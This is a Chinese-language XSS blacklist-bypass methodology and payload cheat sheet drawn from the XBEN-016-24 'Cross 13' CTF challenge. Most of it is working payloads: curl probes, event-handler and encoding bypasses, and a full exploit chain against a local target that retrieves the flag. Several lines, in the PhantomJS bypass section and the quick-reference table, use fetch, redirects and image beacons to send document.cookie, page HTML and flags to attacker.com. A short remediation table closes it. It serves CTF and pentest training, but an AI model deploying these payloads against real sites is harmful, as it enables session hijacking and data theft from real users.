# XSS 黑名单绕过技术（XBEN-016-24 实战）

## 1. 文档概述

### 1.1 编写目的

本文档基于 XBEN-016-24 "Cross 13" XSS 挑战的实战分析，为渗透测试人员提供一套系统化的 XSS 黑名单绕过技术方法论。重点针对弱黑名单过滤、HTML 属性上下文注入、事件处理器绕过等场景，帮助测试人员发现和利用 XSS 漏洞。

### 1.2 适用范围

- 适用于存在弱黑名单过滤的 Web 应用（仅过滤少量关键词）
- 适用于 HTML 属性上下文（尤其是未引号包裹的属性）的 XSS 注入
- 适用于 Flask+PhantomJS 架构的 XSS 验证场景
- 适用于无 CSP 头保护且 X-XSS-Protection 被禁用的应用
- 适用于 CTF XSS 挑战类应用

### 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 进行 XSS 漏洞研究的安全分析师
- CTF 竞赛参赛选手

---

## 2. 核心渗透技术专题

### 专题一：弱黑名单绕过技术

#### 2.1 技术介绍

**漏洞原理：**

弱黑名单过滤是指应用仅过滤少量已知的危险关键词（如 `script`、`onerror`、`onclick` 等），但未对所有可能的 XSS 向量进行全面过滤。这种过滤方式本质上是"安全通过隐匿"（Security by Obscurity），极易被绕过。

**XBEN-016-24 典型黑名单：**

```python
# Flask 应用典型弱黑名单代码
blacklist = ['script', 'onerror', 'onclick', 'onmouseover', "'", " "]

for word in blacklist:
    if word in msg.lower():
        return "Sorry you can't use: '%s'" % word
```

**本质问题：**
- 只过滤 6 个特定字符串
- 大小写不敏感但可绕过
- 未覆盖所有事件处理器
- 未对 HTML 标签进行全面过滤
- 空格过滤可使用替代字符绕过

#### 2.2 攻击场景

| 业务场景 | 功能示例 | 风险点描述 |
| :--- | :--- | :--- |
| **CTF/XSS 挑战** | Dalgona Challenges | 故意设计弱黑名单用于教学 |
| **用户名称显示** | 昵称/用户名展示 | 名称参数直接反射到 HTML |
| **搜索框回显** | 搜索关键词回显 | 搜索词未编码直接输出 |
| **表单值回显** | 验证失败后回显 | value 属性未正确编码 |
| **评论系统** | UGC 内容展示 | 评论内容反射输出 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑名单规则探测

**步骤 1：基础关键词测试**

```bash
# 测试 script 标签
curl "http://target/page?name=<script>alert(1)</script>"
# 响应：Sorry you can't use: 'script'

# 测试 onerror 事件
curl "http://target/page?name=<img src=x onerror=alert(1)>"
# 响应：Sorry you can't use: 'onerror'

# 测试 onclick 事件
curl "http://target/page?name=<div onclick=alert(1)>click</div>"
# 响应：Sorry you can't use: 'onclick'

# 测试单引号
curl "http://target/page?name=test'value"
# 响应：Sorry you can't use: '''

# 测试空格
curl "http://target/page?name=test value"
# 响应：Sorry you can't use: ' '
```

**步骤 2：确定过滤边界**

```bash
# 测试大小写敏感
curl "http://target/page?name=<SCRIPT>alert(1)</SCRIPT>"
# 如果仍被拦截，说明大小写不敏感

# 测试替代事件处理器
curl "http://target/page?name=<body onload=alert(1)>"
# 如果未被拦截，说明 onload 不在黑名单中

# 测试其他标签
curl "http://target/page?name=<svg onload=alert(1)>"
# 如果未被拦截，说明 svg 标签未被过滤
```

##### 2.3.2 HTML 上下文识别

```bash
# 测试参数反射位置
curl -s "http://target/page?name=TESTVALUE" | grep -i "TESTVALUE"

# 查看 HTML 源码确定上下文
# 可能的位置：
# 1. <input value="TESTVALUE">  - 属性上下文（双引号内）
# 2. <input value=TESTVALUE>   - 属性上下文（无引号）
# 3. <div>TESTVALUE</div>      - 标签体上下文
# 4. // TESTVALUE              - JavaScript 注释上下文
```

### 2.4 漏洞利用方法

#### 2.4.1 事件处理器绕过

**场景 1：onerror/onclick 被过滤**

```html
<!-- 使用 onload 事件 -->
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 使用 onmouseover 的替代 -->
<input onmousemove=alert(1)>
<div onmouseenter=alert(1)>
<marquee onstart=alert(1)>

<!-- 使用动画事件 -->
<div style="animation-name:x" onanimationend=alert(1)>
<div style="transition-property:x" ontransitionend=alert(1)>
```

**场景 2：所有 on* 事件处理器被过滤**

```html
<!-- 使用 JavaScript 协议 -->
<a href="javascript:alert(1)">click</a>

<!-- 使用 data: URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- 使用 iframe src -->
<iframe src="javascript:alert(1)">
```

#### 2.4.2 空格过滤绕过

**场景：空格字符被黑名单过滤**

```html
<!-- 方法 1：使用 Tab 字符（%09） -->
<img%09src=x%09onerror=alert(1)>

<!-- 方法 2：使用换行符（%0A） -->
<img%0Asrc=x%0Aonerror=alert(1)>

<!-- 方法 3：使用斜杠分隔 -->
<img/src=x/onerror=alert(1)>

<!-- 方法 4：不使用空格 -->
<svg/onload=alert(1)>
<input/onfocus=alert(1)autofocus>

<!-- 方法 5：使用注释分隔 -->
<img<!--comment-->src=x onerror=alert(1)>
```

#### 2.4.3 单引号过滤绕过

**场景：单引号字符被黑名单过滤**

```html
<!-- 方法 1：使用双引号 -->
<img src="x" onerror="alert(1)">

<!-- 方法 2：不使用引号 -->
<img src=x onerror=alert(1)>

<!-- 方法 3：使用反引号（Template Literals） -->
<img src=x onerror=alert`1`>

<!-- 方法 4：使用 HTML 实体编码 -->
<img src=x onerror=alert&#40;1&#41;>
```

#### 2.4.4 HTML 属性上下文注入

**场景 1：无引号属性上下文**

```html
<!-- 原始 HTML -->
<input type=text name=name placeholder="Enter your name..." {user_input}>

<!-- 注入 Payload -->
> <img src=x onerror=alert(1)>

<!-- 结果 HTML -->
<input type=text name=name placeholder="..." > <img src=x onerror=alert(1)>>
```

**XBEN-016-24 实战 Payload：**

```bash
# 目标应用自动在输入前添加 ">
# 用户输入：onfocus=alert(1)autofocus
# 实际渲染：
<input type=text name=name placeholder="..." > onfocus=alert(1)autofocus>

# 等价于：
<input type=text name=name placeholder="..." onfocus=alert(1) autofocus>
```

**场景 2：双引号属性上下文**

```html
<!-- 原始 HTML -->
<input value="USER_INPUT">

<!-- 注入 Payload -->
" onfocus="alert(1)" autofocus="

<!-- 结果 HTML -->
<input value="" onfocus="alert(1)" autofocus="">
```

#### 2.4.5 完整利用链（XBEN-016-24 实战）

**目标环境：**
- URL: `http://localhost:41185/page?name=<payload>`
- 黑名单：`['script', 'onerror', 'onclick', 'onmouseover', "'", " "]`
- 验证：PhantomJS 检测 alert/confirm/prompt 对话框
- 安全头：`X-XSS-Protection: 0`（显式禁用）
- CSP：无

**攻击步骤：**

```bash
# 步骤 1：确认黑名单规则
curl "http://localhost:41185/page?name=<script>alert(1)</script>"
# 响应：Sorry you can't use: 'script'

curl "http://localhost:41185/page?name=<img src=x onerror=alert(1)>"
# 响应：Sorry you can't use: 'onerror'

curl "http://localhost:41185/page?name=test value"
# 响应：Sorry you can't use: ' '

# 步骤 2：构造绕过 Payload
# 使用 onfocus（不在黑名单中）
# 使用 autofocus 自动触发
# 使用 Tab 代替空格（如果需要）

# 步骤 3：验证 XSS 执行
curl -v "http://localhost:41185/page?name=onfocus=alert(1)autofocus"
# 响应中包含注入的 Payload，PhantomJS 检测到 alert 触发

# 步骤 4：获取 Flag
# PhantomJS 验证成功后返回 Flag
# 响应：Congratulations! Here is the flag: FLAG{...}
```

**成功 Payload 集合：**

```html
<!-- Payload 1：onfocus + autofocus -->
onfocus=alert(1)autofocus

<!-- Payload 2：onmousemove（绕过 onmouseover 过滤） -->
onmousemove=alert(document.domain)

<!-- Payload 3：onanimationstart -->
onanimationstart=alert(1)style=animation-name:x

<!-- Payload 4：完整 HTML 闭合 -->
></html><body><input autofocus onfocus=alert("XSS")>

<!-- Payload 5：数据外带 -->
onfocus=fetch('http://attacker.com/exfil?data='+document.body.innerHTML.substring(0,100))
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 标签过滤绕过

```html
<!-- script 标签被过滤 -->
<script>alert(1)</script>  <!-- 被拦截 -->

<!-- 使用替代标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

#### 2.5.2 关键词过滤绕过

```javascript
// alert 被过滤
alert(1)  <!-- 被拦截 -->

<!-- 使用替代函数 -->
prompt(1)
confirm(1)
print(1)
window['al'+'ert'](1)
self['ale'+'rt'](1)

<!-- 使用编码 -->
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
eval(atob('YWxlcnQoMSk='))
```

#### 2.5.3 大小写混合绕过

```html
<!-- 某些过滤器只检查小写 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg ONLOAD=alert(1)>
```

#### 2.5.4 双重编码绕过

```bash
# URL 编码
%253Cscript%253Ealert(1)%253C/script%253E

# HTML 实体编码
&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;

# Unicode 编码
\u003cscript\u003ealert(1)\u003c/script\u003e
```

#### 2.5.5 PhantomJS 特定绕过

**场景：PhantomJS 拦截 alert/confirm/prompt**

```javascript
// 绕过方法 1：使用其他执行方式
<img src=x onerror=window.status='XSS'>

// 绕过方法 2：使用 location 重定向
<img src=x onerror="location='http://attacker.com/?xss='+document.cookie">

// 绕过方法 3：使用 fetch/XHR 外带
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">

// 绕过方法 4：使用 img beacon
<img src="http://attacker.com/?cookie="+document.cookie>
```

**Flag 外带技术：**

```javascript
// 方法 1：通过 URL 外带
<img src="http://attacker.com/?flag="+document.title>

// 方法 2：通过 fetch 发送
<script>
fetch('http://attacker.com/log', {
    method: 'POST',
    body: document.title  // Flag 通常在 title 中
});
</script>

// 方法 3：提取特定元素
<img src=x onerror="fetch(window.location).then(r=>r.text()).then(html=>{
    const d=new DOMParser().parseFromString(html,'text/html');
    const flag=d.querySelector('.flag').textContent;
    fetch('http://attacker.com/exfil?data='+encodeURIComponent(flag));
})">
```

---

## 3. 附录

### 3.1 XSS Payload 速查表

| 场景 | Payload | 绕过原理 |
| :--- | :--- | :--- |
| **基础探测** | `<svg onload=alert(1)>` | 绕过 script/onerror 过滤 |
| **属性逃逸** | `> <img src=x onerror=alert(1)>` | 闭合无引号属性 |
| **空格绕过** | `<img/src=x/onerror=alert(1)>` | 使用/代替空格 |
| **单引号绕过** | `<img src=x onerror=alert\`1\`>` | 使用反引号 |
| **onfocus 注入** | `onfocus=alert(1)autofocus` | 绕过 onerror/onclick |
| **onmousemove 注入** | `onmousemove=alert(document.domain)` | 绕过 onmouseover |
| **动画事件** | `onanimationstart=alert(1)style=animation-name:x` | 绕过传统事件 |
| **数据外带** | `onfocus=fetch('http://attacker.com/?c='+document.cookie)` | 外带敏感数据 |
| **Flag 窃取** | `onfocus=fetch(window.location).then(r=>r.text()).then(t=>fetch('http://attacker.com/?'+t.match(/flag\{.*?\}/)[0]))` | 提取 Flag |

### 3.2 事件处理器替代清单

| 被过滤 | 替代方案 |
| :--- | :--- |
| `onerror` | `onload`, `onfocus`, `onmousemove`, `onanimationend` |
| `onclick` | `ondblclick`, `onmousedown`, `onmouseup`, `onmouseenter` |
| `onmouseover` | `onmousemove`, `onmouseenter`, `onmouseleave` |
| `onload` | `onerror`, `onpageshow`, `onanimationend` |

### 3.3 利用检查清单

- [ ] 探测黑名单规则（测试所有常见关键词）
- [ ] 确定 HTML 输出上下文（属性/标签体/JS）
- [ ] 识别未过滤的事件处理器
- [ ] 识别未过滤的 HTML 标签
- [ ] 测试空格/引号替代方案
- [ ] 构造最终 Payload
- [ ] 验证 XSS 执行（弹窗/外带）
- [ ] 提取敏感数据（Cookie/Flag/页面内容）

### 3.4 修复建议

| 问题 | 修复方案 |
| :--- | :--- |
| 弱黑名单过滤 | 使用白名单验证，仅允许字母数字 |
| 引号未转义 | 使用 `html.escape(input, quote=True)` |
| 标签未过滤 | 实施严格的输入验证 |
| 无 CSP 保护 | 添加 `Content-Security-Policy: default-src 'self'` |
| X-XSS-Protection 禁用 | 设置 `X-XSS-Protection: 1; mode=block` |

---

**文档版本：** 1.0
**最后更新：** 2026 年 3 月
**参考来源：** XBEN-016-24 "Cross 13" 渗透测试实战分析
